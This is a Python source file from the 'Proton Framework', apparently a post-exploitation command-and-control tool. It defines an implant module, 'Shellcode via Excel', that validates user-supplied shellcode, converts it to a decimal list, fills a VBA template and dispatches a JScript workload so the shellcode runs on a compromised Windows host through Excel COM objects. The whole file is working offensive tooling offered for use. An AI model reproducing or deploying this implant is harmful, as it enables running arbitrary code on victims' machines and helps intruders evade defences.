#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.implant
import core.job
import string

class ExcelShellcodeJob(core.job.Job):
    def done(self):
        self.results = "Completed"
        self.display()

    def display(self):
        pass
        #self.shell.print_plain(str(self.errno))

class ExcelShellcodeImplant(core.implant.Implant):

    NAME = "Shellcode via Excel"
    DESCRIPTION = "Executes arbitrary shellcode using Excel COM objects."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/inject/shellcode_excel"

    def load(self):
        self.options.register("SHELLCODE", "90c3", "Shellcode ASCII hex.", required=True)
        self.options.register("SHELLCODEDECCSV", "", "Decimal CSV shellcode.", hidden=True)
        self.options.register("VBACODE", "", "The .vba source.", hidden=True)

        # todo: we need to createprocess/remotethread instead of createthread
        # but heres a quick fix that will let us migrate
        self.options.register("SLEEP", "30000", "How long to wait for shellcode to run.")

    def job(self):
        return ExcelShellcodeJob

    def run(self):
        shellcode = self.options.get("SHELLCODE")

        if not self.validate_shellcode(shellcode):
            self.shell.print_error("SHELLCODE option is an invalid hex string!")
            return

        self.options.set("SHELLCODEDECCSV", self.convert_shellcode(shellcode))

        vba = self.loader.load_script("data/implant/inject/shellcode.vba", self.options)
        vba = vba.decode().replace("\n", "\\n")

        self.options.set("VBACODE", vba)

        workloads = {}
        workloads["js"] = self.loader.load_script("data/implant/inject/shellcode_excel.js", self.options)

        self.dispatch(workloads, self.job)
